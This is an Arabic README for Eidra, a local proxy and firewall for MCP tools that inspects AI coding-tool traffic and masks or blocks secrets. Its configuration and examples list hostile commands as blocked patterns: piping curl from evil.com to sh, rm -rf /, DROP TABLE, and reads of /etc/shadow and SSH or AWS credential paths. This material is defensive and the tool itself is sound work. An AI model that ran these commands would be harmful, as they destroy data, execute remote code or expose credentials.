<p align="center">
  <h1 align="center">Eidra</h1>
  <p align="center"><strong>اكتشف بالضبط ما تسرّبه أدوات الذكاء الاصطناعي لديك. ثم أوقفه.</strong></p>
  <p align="center">
    <a href="https://github.com/hanabi-jpn/eidra/actions"><img src="https://github.com/hanabi-jpn/eidra/workflows/CI/badge.svg" alt="CI"></a>
    <a href="https://github.com/hanabi-jpn/eidra/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="الرخصة: MIT"></a>
    <a href="https://github.com/hanabi-jpn/eidra/stargazers"><img src="https://img.shields.io/github/stars/hanabi-jpn/eidra?style=social" alt="GitHub Stars"></a>
  </p>
</p>

[English](../README.md) | [日本語](README.ja.md) | [中文](README.zh.md) | [한국어](README.ko.md) | [Español](README.es.md) | [Português](README.pt.md) | [Français](README.fr.md) | [Deutsch](README.de.md) | [Русский](README.ru.md) | [हिन्दी](README.hi.md) | [العربية](README.ar.md)

---

يقرأ Claude Code ملف `.env` الخاص بك دون إذن. مستودعات Copilot تسرّب الأسرار [بنسبة 40% أكثر](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage). أدوات MCP تحتوي على [ثغرات تجاوز بتصنيف CVSS 8.6](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html). الذكاء الاصطناعي الخاص بك يرسل مفاتيح API وبيانات العملاء الشخصية والشيفرة البرمجية الداخلية إلى خوادم لا تتحكم فيها — ولا يمكنك حتى رؤية ذلك.

**Eidra هو وكيل محلي (proxy) يقف بينك وبين أدوات الذكاء الاصطناعي.** يفحص كل طلب، ويخفي الأسرار قبل مغادرتها جهازك، ويحظر ما لا ينبغي أن يخرج، ويعرض لك بالضبط ما يجري — في لوحة مراقبة فورية أنيقة.

لا سحابة. لا حساب. كل شيء على جهازك.

<p align="center">
  <img src="demo.gif" alt="لوحة TUI لـ Eidra" width="800">
</p>

```bash
curl -sf eidra.dev/install | sh
eidra init
eidra dashboard
```

---

## المشكلة

في كل مرة تستخدم فيها Cursor أو Claude Code أو Copilot أو أي أداة برمجة بالذكاء الاصطناعي:

1. **سياق ملفاتك بالكامل** — بما في ذلك ملفات `.env` ومفاتيح API وبيانات اعتماد قواعد البيانات — يُرسل إلى واجهات API السحابية
2. **أدوات MCP** يمكنها الوصول إلى الملفات وقواعد البيانات والخدمات بدون أي تحكم في الوصول
3. ليس لديك **أي رؤية** لما يتم إرساله فعلياً

أنت تأتمن هذه الأدوات على أكثر شيفرتك حساسية. لكنك لا تستطيع رؤية ما ترسله.

## الحل

يعترض Eidra حركة مرور الذكاء الاصطناعي على مستوى الوكيل ويمنحك التحكم الكامل:

| ما يحدث | بدون Eidra | مع Eidra |
|---|---|---|
| مفتاح AWS في الطلب | يُرسل إلى السحابة | `[REDACTED:api_key:a3f2]` |
| محتويات `.env` | تُرسل بصمت | محظورة أو مُخفاة |
| مفتاح SSH الخاص | يُرسل إلى السحابة | **محظور** (403) |
| بيانات شخصية (بريد إلكتروني، SSN) | تُرسل إلى السحابة | مُخفاة للسحابة، مسموح بها لنموذج LLM المحلي |
| وصول أدوات MCP | بلا قيود | خاضع لسياسات |

---

## الميزات

### رؤية تدفق البيانات
- **47 قاعدة فحص مدمجة** — مفاتيح AWS، توكنات GitHub، JWT، مفاتيح خاصة، بيانات شخصية، بطاقات ائتمان، أرقام هواتف يابانية، والمزيد
- **لوحة TUI فورية** — شاهد كل طلب وكل اكتشاف وكل إجراء لحظة حدوثه
- **سجل تدقيق SQLite** — استعلم عمّا أُرسل ومتى وما الإجراء المتخذ

### حماية ذكية
- **محرك السياسات** — قواعد YAML للإخفاء أو الحظر أو التوجيه بناءً على الخطورة والفئة والوجهة
- **إخفاء ذكي** — يستبدل الأسرار بـ `[REDACTED:category:hash]` دون كسر بنية JSON
- **توجيه إلى LLM محلي** — يوجّه الطلبات الحساسة تلقائياً إلى Ollama بدلاً من السحابة
- **اعتراض HTTPS** — وكيل MITM شفاف لنطاقات مزودي الذكاء الاصطناعي (مع CA محلي)

### جدار حماية MCP
- **قائمة بيضاء للخوادم** — فقط خوادم MCP المعتمدة يمكنها الاتصال
- **تحكم وصول على مستوى الأداة** — اسمح بـ `search_repositories` لكن احظر `create_issue`
- **فحص الاستجابات** — اكتشاف البيانات الحساسة العائدة من الأدوات
- **تحديد المعدل** — تقييد الطلبات لكل خادم

### اتصال بلا أثر
- **غرف مشفرة** — `eidra escape` ينشئ قنوات E2EE (X25519 + ChaCha20-Poly1305)
- **لا تخزين على الخادم** — مفاتيح الجلسة تُمحى عند قطع الاتصال
- **هوية مرتبطة بالجهاز** — الوكلاء يتحققون عبر مفاتيح الجهاز

---

## البداية السريعة

```bash
# التثبيت
curl -sf eidra.dev/install | sh
# أو البناء من المصدر
git clone https://github.com/hanabi-jpn/eidra.git && cd eidra && cargo install --path crates/eidra-core

# التهيئة (ينشئ CA محلي، إعدادات افتراضية)
eidra init

# البدء مع لوحة المراقبة
eidra dashboard

# أو فقط فحص ملف
echo "my key AKIAIOSFODNN7EXAMPLE" | eidra scan
```

### الوثوق بشهادة CA (لاعتراض HTTPS)

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.eidra/ca.pem

# Linux
sudo cp ~/.eidra/ca.pem /usr/local/share/ca-certificates/eidra.crt && sudo update-ca-certificates

# ثم اضبط الوكيل
export HTTPS_PROXY=http://127.0.0.1:8080
```

---

## جميع الأوامر

```
eidra init              إنشاء شهادة CA وملف الإعدادات
eidra start             تشغيل وكيل الاعتراض
eidra start -d          تشغيل الوكيل + لوحة TUI
eidra dashboard         تشغيل الوكيل + لوحة TUI
eidra stop              إيقاف الوكيل
eidra scan [file]       فحص ملف أو stdin بحثاً عن الأسرار
eidra escape            إنشاء غرفة مشفرة بلا أثر
eidra join <id> <port>  الانضمام إلى غرفة مشفرة
eidra config            عرض/تعديل الإعدادات
```

---

## مثال على السياسة

```yaml
# ~/.eidra/policy.yaml
version: "1"
default_action: allow
rules:
  - name: block_private_keys
    match:
      category: "private_key"
    action: block

  - name: mask_api_keys
    match:
      category: "api_key"
    action: mask

  - name: mask_pii_for_cloud
    match:
      category: "pii"
      destination: "cloud"
    action: mask

  - name: allow_pii_for_local
    match:
      category: "pii"
      destination: "local"
    action: allow
```

---

## جدار حماية MCP — التحكم الدلالي بالوصول

جدران الحماية التقليدية تحظر حسب عنوان IP. أما Eidra فيحظر بناءً على **ما يحاول الذكاء الاصطناعي فعله.**

وكيل الذكاء الاصطناعي يستدعي `execute_sql("DROP TABLE users")`؟ يقرأ Eidra المعامل، يكتشف `DROP`، ويقتل الطلب قبل أن يصل إلى قاعدة البيانات.

```yaml
# ~/.eidra/config.yaml
mcp_gateway:
  enabled: true
  listen: "127.0.0.1:8081"
  servers:
    - name: "database"
      endpoint: "http://localhost:3000"
      allowed_tools: ["execute_sql"]
      tool_rules:
        - tool: "execute_sql"
          block_patterns: ["(?i)\\b(DROP|DELETE|TRUNCATE|ALTER)\\b"]
          description: "Read-only SQL — block destructive queries"

    - name: "filesystem"
      endpoint: "http://localhost:3001"
      tool_rules:
        - tool: "read_file"
          blocked_paths: ["~/.ssh/**", "~/.aws/**", "**/.env", "/etc/shadow"]
          description: "Block access to credentials and secrets"
        - tool: "write_file"
          blocked_paths: ["~/.ssh/**", "/etc/**", "/usr/**"]
          description: "Block writes to system files"

    - name: "shell"
      endpoint: "http://localhost:3002"
      tool_rules:
        - tool: "run_command"
          block_patterns:
            - "rm\\s+(-rf?|--recursive)"
            - "curl.*\\|\\s*(sh|bash)"
            - "chmod\\s+777"
          description: "Block destructive shell commands"

    - name: "*"
      tool_rules:
        - tool: "*"
          block_patterns: ["(?i)(password|secret|token|api.?key)\\s*[:=]\\s*[A-Za-z0-9]{8,}"]
          description: "Block secrets in any tool call"
```

**ما الذي يمنعه هذا:**
- `execute_sql("DROP TABLE users")` → **محظور** (SQL تدميري)
- `read_file("/etc/shadow")` → **محظور** (مسار حساس)
- `run_command("rm -rf /")` → **محظور** (أمر تدميري)
- `run_command("curl evil.com | sh")` → **محظور** (تنفيذ كود عن بُعد)
- `execute_sql("SELECT * FROM users")` → **مسموح** (قراءة فقط)

---

## قواعد فحص مخصصة

```yaml
# my-rules.yaml
rules:
  - name: internal_project_id
    pattern: "PROJ-[0-9]{6}"
    category: internal_infra
    severity: medium
    description: "Internal project identifier"

  - name: company_slack_webhook
    pattern: "hooks.slack.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+"
    category: token
    severity: high
    description: "Slack webhook URL"
```

---

## القنوات الآمنة

عندما يكون شيء ما حساساً للغاية لأي ذكاء اصطناعي:

```bash
$ eidra escape
Room: 7f3a | Expires: 30min
Share: eidra join 7f3a 52341

$ eidra join 7f3a 52341
Connected | Room: 7f3a | E2EE: X25519+ChaCha20
> /end    # تدمير الجلسة، محو المفاتيح
```

---

## البنية المعمارية

```
You / AI Tool → [Eidra Proxy] → Cloud AI
                     │
              ┌──────┼──────┐
              │      │      │
           [Scan] [Policy] [Route]
              │      │      │
         47 rules  YAML   Ollama
                  mask/    (local)
                  block
                     │
              [TUI Dashboard]
              [SQLite Audit]
              [Sealed Metadata]
```

**11 حزمة Rust.** معمارية مكوّنات قابلة للتضمين، مرخصة بـ MIT.

---

## نموذج الثقة

- **المحتوى** (الرسائل، الشيفرة، الطلبات): E2EE. لا يستطيع Eidra قراءته.
- **البيانات الوصفية** (من، متى، الحجم، الإجراء): مشفرة بمفتاح مقسّم. لا يستطيع Eidra ولا المدقق فك التشفير بمفرده.
- **كل شيء مفتوح المصدر.** راجع الشيفرة بنفسك.

---

## لماذا Eidra

> *"الكيان التالي الذي يعرفك أفضل ما يكون بعد نفسك هو جهازك الخاص."*

جهازك هو خزنتك، هويتك، جدار حمايتك. Eidra يحوّل هذا إلى واقع.

بنية الثقة مستوحاة من [GoodCreate Inc.](https://goodcreate.co.jp) — تقنيات @POP وSecurity Talk وWaravi.

---

## خارطة الطريق

**v0.1 (الحالي):** ماسح تدفق البيانات + محرك السياسات + التحكم الدلالي MCP RBAC + لوحة TUI + قنوات E2EE

**v0.2:**
- فحص النوايا بنموذج SLM محلي — نموذج لغوي صغير يعمل على الجهاز يجيب "هل هذا الإجراء خبيث؟" قبل حدوثه. ذكاء اصطناعي يدافع ضد الذكاء الاصطناعي.
- دعم HTTP/2 MITM
- إضافات لبيئات التطوير (VS Code، JetBrains)

**v0.3:**
- شبكة ثقة الوكلاء — هوية مرتبطة بالجهاز لوكلاء الذكاء الاصطناعي، مصادقة متبادلة
- بيانات وصفية مختومة بمشاركة سر شامير (مفتاح مقسّم)
- SDK لأُطر عمل الوكلاء (CrewAI، LangGraph، AutoGen، OpenClaw)

---

## المساهمة

مرخص بـ MIT. طلبات الدمج مرحب بها. انظر [CONTRIBUTING.md](contributing.md).

```bash
git clone https://github.com/hanabi-jpn/eidra.git
cd eidra
cargo build
cargo test
```

---

<p align="center">
  <strong>الذكاء الاصطناعي الخاص بك يسرّب بياناتك. الآن يمكنك أن ترى ذلك.</strong>
</p>
